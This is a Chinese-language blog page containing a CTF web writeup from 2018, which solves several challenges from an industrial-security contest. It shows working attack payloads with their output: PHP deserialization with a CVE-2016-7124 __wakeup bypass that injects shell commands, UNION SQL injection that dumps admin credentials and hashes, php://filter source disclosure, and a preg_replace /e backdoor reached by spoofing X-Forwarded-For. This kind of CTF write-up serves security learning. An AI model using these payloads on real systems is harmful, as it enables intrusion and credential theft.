@@ -1,0 +1,1222 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="cqIhQLk06F" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,writeup,web," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="为什么比赛要办在考试周。。一些题是比赛完后做的，暂时只写了部分题的wp。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="赛博地球杯工业互联网安全大赛-Web-writeup">
+<meta property="og:url" content="http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/index.html">
+<meta property="og:site_name" content="Chybeta">
+<meta property="og:description" content="为什么比赛要办在考试周。。一些题是比赛完后做的，暂时只写了部分题的wp。">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/4.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/2.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/1.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/3.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/5.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/6.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/7.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/8.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/10.jpg?raw=true">
+<meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/11.jpg?raw=true">
+<meta property="og:updated_time" content="2018-01-20T03:49:21.213Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="赛博地球杯工业互联网安全大赛-Web-writeup">
+<meta name="twitter:description" content="为什么比赛要办在考试周。。一些题是比赛完后做的，暂时只写了部分题的wp。">
+<meta name="twitter:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/4.jpg?raw=true">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/"/>
+
+
+
+
+
+  <title> 赛博地球杯工业互联网安全大赛-Web-writeup | Chybeta </title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Chybeta</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+    
+      <p class="site-subtitle"></p>
+    
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
+            
+            朋友
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                赛博地球杯工业互联网安全大赛-Web-writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-18T11:17:24+08:00">
+                2018-01-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">writeup:Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2018/01/18/赛博地球杯工业互联网安全大赛-Web-writeup/" class="leancloud_visitors" data-flag-title="赛博地球杯工业互联网安全大赛-Web-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>为什么比赛要办在考试周。。<br>一些题是比赛完后做的，暂时只写了部分题的wp。<br><a id="more"></a></p>
+<h1 id="大量设备报表不见了（签道题）"><a href="#大量设备报表不见了（签道题）" class="headerlink" title="大量设备报表不见了（签道题）"></a>大量设备报表不见了（签道题）</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。</div><div class="line">http://120.27.14.73:20006/</div></pre></td></tr></table></figure>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>报表中心有链接，发现url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://120.27.14.73:20006/index.php?id=1</div></pre></td></tr></table></figure></p>
+<p>不是sql注入，尝试爆破。当id=2333时：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/4.jpg?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;2333_bao_pO_OOOO0o_o0OOO&#125;</div></pre></td></tr></table></figure>
+<h1 id="工控系统的敏感消息遭泄漏"><a href="#工控系统的敏感消息遭泄漏" class="headerlink" title="工控系统的敏感消息遭泄漏"></a>工控系统的敏感消息遭泄漏</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云平台消息中心，泄漏了不该泄漏的消息。导致系统可以被入侵。</div><div class="line">http://47.104.99.231:20003/</div></pre></td></tr></table></figure>
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>存在git泄露，用githack下载源码进行审计。</p>
+<p>index2.php中，有如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$secret = $_GET[<span class="string">'secret'</span>];</div><div class="line">$ad  = $_GET[<span class="string">'ad'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($ad))&#123;</div><div class="line">    <span class="keyword">if</span>(ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $ad) === <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! Again !")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(strpos($ad, <span class="string">'--'</span>) !== <span class="keyword">FALSE</span>)</div><div class="line">    &#123;</div><div class="line">				<span class="keyword">echo</span> <span class="string">"Ok Evrything will be fine!&lt;br &gt;&lt;br &gt;"</span>;</div><div class="line">				<span class="keyword">if</span> (stripos($secret, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">					<span class="keyword">die</span>();</div><div class="line">				&#125;</div><div class="line">        unserialize($secret);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("Sorry ! You must have --")&lt;/script&gt;'</span>;</div><div class="line">    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
+<p><code>ereg</code>，可以用<code>%00</code>绕过，然后再让<code>--</code>出现在<code>%00</code>的后面，即可进入第二个分支，进行反序列操作。在进行反序列化之前，进行了判断，不允许<code>$secret</code>中出现<code>./</code></p>
+<p>在class.php中，定义了如下类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $file=<span class="string">"Welcome"</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = $file;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'sleep.txt'</span>;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'file'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'wakeup.txt'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'wakeup.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'sleep.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'Welcome'</span>) &#123;</div><div class="line">        	system(<span class="string">"php ./import/$this-&gt;file.php"</span>);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">        	<span class="keyword">echo</span> <span class="string">"&lt;?php Something destroyed ?&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在<code>__destruct</code>阶段，进行了system操作，但在反序列化时<code>__wakeup</code>方法的调用会设置file为<code>wakeup.txt</code>，CVE-2016-7124中提到可以如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。因此可以绕过，也即file字段可控，且没有过滤。</p>
+<p>由前分析，由于不允许出现<code>./</code>，我们考虑先获得绝对路径。</p>
+<p>在class.php中，将<code>sleep</code>方法注释掉，在尾部添加</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =<span class="keyword">new</span> Record(<span class="string">'Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf'</span>);</div><div class="line">$c = serialize($b);</div><div class="line"><span class="keyword">echo</span> $c;</div></pre></td></tr></table></figure>
+<p>这样在执行时即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">system(&quot;php ./import/Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf.php&quot;);</div></pre></td></tr></table></figure></p>
+<p>pwd是为了获取当前路径，之后的是因为有一个<code>.php</code>的后缀。得到；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>url编码后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A33%3A%22Flag.php%20%26%26%20pwd%20%26%26%20pwd%20%26%26%20cat%20waf%22%3B%7D</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/2.jpg?raw=true" alt=""></p>
+<p>获得绝对路径为/var/www/html。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =new Record(&apos;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&apos;);</div><div class="line">$c = serialize($b);</div><div class="line">echo $c;</div></pre></td></tr></table></figure>
+<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
+<p>url编码，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A48%3A%22Flag.php%20%26%26%20pwd%20%26%26%20cat%20%2fvar%2fwww%2fhtml%2fimport%2fFlag%22%3B%7D</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/1.jpg?raw=true" alt=""></p>
+<p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;g_i_i_t_is_unsafe_ahhhahahah&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="工控管理系统新版本"><a href="#工控管理系统新版本" class="headerlink" title="工控管理系统新版本"></a>工控管理系统新版本</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。</div><div class="line">http://47.104.1.173:20004/</div></pre></td></tr></table></figure>
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>findpwd.php有注入漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</div><div class="line"></div><div class="line">information_schema&lt;br&gt;cetc004&lt;br&gt;mysql&lt;br&gt;performance_schema&lt;br&gt;</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x63657463303034)),32#</div><div class="line"></div><div class="line"></div><div class="line">admin&lt;br&gt;user&lt;br&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e)),32#</div><div class="line"></div><div class="line">username&lt;br&gt;password&lt;br&gt;question&lt;br&gt;answer&lt;br&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer)+FROM+cetc004.admin)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer+SEPARATOR+0x3c62723e)+FROM+cetc004.user)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds&lt;br&gt;</div><div class="line">1 c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">admin c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">root c81e728d9d4c2f636f067f89cc14862c 1 1&lt;br&gt;</div><div class="line">&apos; 024c94d6e03b6f67a86b952b914816c7 &apos; &apos;&lt;br&gt;</div><div class="line">xxoo e10adc3949ba59abbe56e057f20f883e 123456 123456</div></pre></td></tr></table></figure>
+<h1 id="工控云管理系统设备维护中心被植入后门"><a href="#工控云管理系统设备维护中心被植入后门" class="headerlink" title="工控云管理系统设备维护中心被植入后门"></a>工控云管理系统设备维护中心被植入后门</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</div><div class="line">http://47.104.74.209:20005</div></pre></td></tr></table></figure>
+<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><p>利用page参数和php伪协议读取源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
+<p>得到index.php源码，其中第121行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</div><div class="line"></div><div class="line">    $pattern = $_GET[pat];</div><div class="line">    $replacement = $_GET[rep];</div><div class="line">    $subject = $_GET[sub];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</div><div class="line">        preg_replace($pattern, $replacement, $subject);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里存在后门，添加头部和对应GET字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;ls&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
+<p>发现一个目录s3chahahaDir，之后还有一个目录flag，里面有flag.php<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/3.jpg?raw=true" alt=""></p>
